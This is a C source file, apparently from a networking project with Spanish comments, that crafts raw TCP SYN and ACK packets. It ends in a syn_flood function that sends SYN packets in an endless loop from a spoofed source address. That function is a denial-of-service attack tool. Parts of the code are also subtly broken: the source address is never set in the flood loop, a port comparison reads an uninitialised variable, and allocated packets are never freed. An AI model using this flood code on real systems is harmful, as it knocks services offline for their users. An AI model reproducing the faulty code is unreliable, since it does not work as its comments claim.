#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>	//tcp header
#include <netinet/udp.h>	// udp header
#include <netinet/ip.h>	// ip_header
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "./includes/checksum.h"
#include "./includes/tcp.h"

#define PACKET_LEN 4096
#define OPT_SIZE 20

//Funcion que dados una direccion y un puerto crea una estructura sockaddr_in
int host_addr(struct sockaddr_in *h_addr, char *addr, int port){
	struct sockaddr_in host;
	host.sin_family = AF_INET;
	host.sin_port = htons(port);
	if (inet_pton(AF_INET, addr, &host.sin_addr) != 1)
	{
		printf("destination IP configuration failed\n");
		return 1;
	}
	*h_addr = host;
	return 0;
}

//Funcion que crea un paquete SYN TCP con la direccion de origen y destino dadas
void tcp_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** packet_ret, int* packet_len){

    char *packet = calloc(PACKET_LEN, sizeof(char));
	char *pseudogram;// *data
	
	//IP header
	struct iphdr *iph = (struct iphdr *) packet;
	
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct iphdr));
	struct pseudo_header psh;
	
	//IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + OPT_SIZE;
	iph->id = htonl(rand() % 65535);
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = src->sin_addr.s_addr;
	iph->daddr = dst->sin_addr.s_addr;

	//Ip checksum
	iph->check = csum ((unsigned short *) packet, iph->tot_len);
	
	//TCP Header
	tcph->source = src->sin_port;
	tcph->dest = dst->sin_port;
	tcph->th_seq = htonl(rand() % 4294967295);
	tcph->ack_seq = htonl(0);
	tcph->doff = sizeof(struct tcphdr) / 4;
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons(5840);
	tcph->check = 0;
	tcph->urg_ptr = 0;
	
	//TCP checksum
	psh.source_address = src->sin_addr.s_addr;
	psh.dest_address = dst->sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.prt_length = htons(sizeof(struct tcphdr) + OPT_SIZE);
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPT_SIZE;
	pseudogram = malloc(psize);
	
	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + OPT_SIZE);
/*
	packet[40] = 0x02;
	packet[41] = 0x04;
	int16_t mss = htons(48);
	memcpy(packet + 42, &mss, sizeof(int16_t));
	packet[44] = 0x04;
	packet[45] = 0x02;
	pseudogram[32] = 0x02;
	pseudogram[33] = 0x04;
	memcpy(pseudogram + 34, &mss, sizeof(int16_t));
	pseudogram[36] = 0x04;
	pseudogram[37] = 0x02;
	*/
	tcph->check = csum( (unsigned short*) pseudogram , psize);

    *packet_ret = packet;
	*packet_len = iph->tot_len;
	free(pseudogram);
}

// Funcion que espera a recibir un paquete por el socket dado
int receive_from(int sock, char* buffer, size_t buffer_length, struct sockaddr_in *dst)
{
	unsigned short dst_port;
	int received;
	while (dst_port != dst->sin_port)
	{
		received = recv(sock, buffer, buffer_length, 0);
		if (received < 0)
			break;
		memcpy(&dst_port, buffer + 22, sizeof(dst_port));
	}
	printf("received bytes: %d\n", received);
	printf("destination port: %d\n", ntohs(dst->sin_port));
	return received;
}

// Funcion que crea un paquete ACK con direccion de origen, destino, numero de sequencia y numero de ack dado
void create_ack_packet(struct sockaddr_in* src, struct sockaddr_in* dst, int32_t seq, int32_t ack_seq, char** out_packet, int* out_packet_len)
{
	// datagram to represent the packet
	char *datagram = calloc(PACKET_LEN, sizeof(char));

	// required structs for IP and TCP header
	struct iphdr *iph = (struct iphdr*)datagram;
	struct tcphdr *tcph = (struct tcphdr*)(datagram + sizeof(struct iphdr));
	struct pseudo_header psh;

	// IP header configuration
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE;
	iph->id = htonl(rand() % 65535); // id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0; // correct calculation follows later
	iph->saddr = src->sin_addr.s_addr;
	iph->daddr = dst->sin_addr.s_addr;

	// TCP header configuration
	tcph->source = src->sin_port;
	tcph->dest = dst->sin_port;
	tcph->seq = htonl(seq + 1);
	tcph->ack_seq = htonl(ack_seq + 1);
	tcph->doff = 5; // tcp header size
	tcph->fin = 0;
	tcph->syn = 0;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 1;
	tcph->urg = 0;
	tcph->check = 0; // correct calculation follows later
	tcph->window = htons(5840); // window size
	tcph->urg_ptr = 0;

	// TCP pseudo header for checksum calculation
	psh.source_address = src->sin_addr.s_addr;
	psh.dest_address = dst->sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.prt_length = htons(sizeof(struct tcphdr));
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPT_SIZE;
	// fill pseudo packet
	char* pseudogram = malloc(psize);
	memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + OPT_SIZE);

	tcph->check = csum((unsigned short*)pseudogram, psize);
	iph->check = csum((unsigned short*)datagram, iph->tot_len);

	*out_packet = datagram;
	*out_packet_len = iph->tot_len;
	free(pseudogram);
}

// Funcion que lee el numero de sequencia y ack del paquete dado
void read_seq_and_ack(const char* packet, uint32_t* seq, uint32_t* ack)
{
	// read sequence number
	uint32_t seq_num;
	memcpy(&seq_num, packet + 24, 4);
	// read acknowledgement number
	uint32_t ack_num;
	memcpy(&ack_num, packet + 28, 4);
	// convert network to host byte order
	*seq = ntohl(seq_num);
	*ack = ntohl(ack_num);
	printf("sequence number: %lu\n", (unsigned long)*seq);
	printf("acknowledgement number: %lu\n", (unsigned long)*ack);
}

// Funcion que genera paquetes SYN tcp con direccion de origen, destino y puerto dados en bucle
int syn_flood(int sockfd, char *address_dst, char *address_src, int port){
	while(1){
		// direccion IP de destino
		struct sockaddr_in daddr;
		if(host_addr(&daddr, address_dst, port) == 1){
			return 1;
		}

		// direccion IP de origen
		struct sockaddr_in saddr;
		if(host_addr(&daddr, address_src, rand() % 65536) == 1){
			return 1;
		}

		char* packet;
		int packet_len;
		tcp_syn_packet(&saddr, &daddr, &packet, &packet_len);
		sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr));
    }
}